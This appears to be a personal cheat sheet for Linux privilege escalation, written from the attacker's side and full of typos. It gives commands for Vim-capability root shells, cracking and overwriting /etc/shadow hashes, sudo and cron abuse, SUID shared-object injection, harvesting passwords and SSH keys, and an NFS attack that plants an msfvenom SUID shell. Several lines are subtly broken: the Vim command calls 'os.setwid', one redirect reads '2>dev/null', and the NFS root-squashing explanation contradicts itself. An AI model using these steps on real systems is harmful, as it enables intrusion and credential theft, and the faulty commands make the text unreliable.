# Linux Privelage Escalation Tools

- LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
- LinEnum: https://github.com/rebootuser/LinEnum
- LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester
- Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration
- Linux Priv Checker: https://github.com/linted/linuxprivchecker

# Using Capqabilities

List capabilities using the following command:
`getcap -r / 2>dev/null`

IF `Vim` listed use to launch root shell:
`/vim -c ':py3 import os; os.setwid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'`

_Note: For Binaries use `GTFObins` which has a good list of bianries that can be leveraged fro privilege escalation._

# Weak File Permissions

The `/etc/shadow` file contains user password hashes and is usually readable only by the root user. The user passwords are stored in the follwoing format:

```cmd
root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0
```

- The format of the password is `$id$salt$hash`
- `root`: This is the username
- `$6`: This is the type of hash encryption being used
- Anything between the first and second colon (:) of each line is the password hash

1. Check the permission of the file using the following command:

```cmd
ls -l /etc/shadow
-rw-r--rw- 1 root shadow 837 Aug 25  2019 /etc/shadow
```

2. After finidng that we have read/write permission we can copy the hash of the root user and crack it using john:

```cmd
john --wordlist=/usr/share/wordlists/rockyou.txt <HASH.txt>
```

3. We can also change the password of the root user in `/etc/shadow`:
   - Create a sha-512 password:
   ```cmd
   mkpasswd -m sha-512 newpasswordhere
   ```
   - Copy the hash and replace the root user hash.
   - Verify my chaning to root user `su root`
4. We can also change the password of the root user in `/etc/passwd`:
   - Create a password:
   ```cmd
   mkpasswd -m sha-512 newpasswordhere
   ```
   - Copy the hash and replace the root user hash in `/etc/passwd.
   - Verify my chaning to root user `su root`

# Sudo

1. Check the sudo permission list the user has to verify the commands the user is able to run:
   - Use the following command:
   ```cmd
   sudo -l
   ```
   - Visit `GTFOBins` and saerch for the program anmes. If the program is listed with "sudo" as a funciton, you can use it to elevate privilgeses.
   - Now create a root shell

# Using Cron Jobs

Cron jobs are used to run scripts or binaries at specific times. By default, they run with the privilege of their owners and not the current user. While properly configured cron jobs are not inherently vulnerable, they can provide a privilege escalation vector under some conditions.

Cron Jobs configs are stored in cron tabs `cat /etc/crontab`. Users can find executable script and modify it to launch reverse shell.

- Sometimes old scripts are deleted from source directory but not from cron jobs. Users can create fake cron jobs under their profile and Crpn Jobs will run the malicous executables.

# SUID/SGID Executables

## Known Exploits

Find all the SUID/SGID executables by using the following command:

```cmd
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```

You can go through all the results and see if there is an applicaiton that can be exploitable using `Exploit-DB`, Goolge or Github.

## Shared Object Injection

The `/usr/local/bin/suid-so` SUID executable is vulnerable to shared object injection.

1. Excute the file and see what happens. It should just display a progress bar before exiting:

```cmd
/usr/local/bin/suid-so
```

2. Run strace on the file and search the output for open/access calls and for "no such file" errors:

```cmd
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
```

From running the command we can see all the directories the program is trying to load from. Sometimes it may access your home directory but no files may be there. Here is our chance to inject a shell malicous file to get a root shell. 3. If a shared object exist uder `/home/....`, create a `.so` executable which will allow you to get a reverse shell. 4. Execute the `/usr/local/bin/suid-so`

# Passwords & Keys

## History Files

If a user accidentally types their password on the command line instead of into a password prompt, it may get recorded in a history file. You can view the content using the following commands:

```cmd
cat ~/.*history | less
```

## Config Files

Config files often contain passwords in plaintext or other reversible formats. List the contents of the user's home directory:

```cmd
ls /home/user
```

Depending on the type of file present you can open it and inspect it for stored credentials.

## SSH Keys

Sometimes users make backups of important files but fail to secure them with the correct permissions. Look for hidden files & directories in the system root:

```cmd
ls -la /
```

One important hidden folder is the `.ssh` folder which stores private keys. We can grab these type of keys change the permission using `chmod 600 <NAME>` and use it to log into other machines.

# NFS

Files created via NFS inherit the remote user's ID. If the user is root, and root squashing is enabled, the ID will instead be set to the "nobody" user. If the /tmp share has root squashing disabled we can misuse it. We can check the NFS share configuration using:
If the /tmp share has root squashing disabled.

```cmd
cat /etc/exports
```

1. On your attack box, switch to your root user if you are not already running as root. Using Kali's root user, create a mount point on your Kali box and mount the /tmp share (update the IP accordingly):

```cmd
mkdir /tmp/nfs
mount -o rw,vers=3 <VICTIM_IP>:/tmp /tmp/nfs
```

2. Using Attack machine root user, generate a payload using msfvenom and save it to the mounted share (this payload simply calls /bin/bash):

```cmd
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
```

3. Still using Attack Machine root user, make the file executable and set the SUID permission:

```cmd
chmod +xs /tmp/nfs/shell.elf
```

4. Back on the Victim Machine, as the low privileged user account, execute the file to gain a root shell:

```cmd
/tmp/shell.elf
```
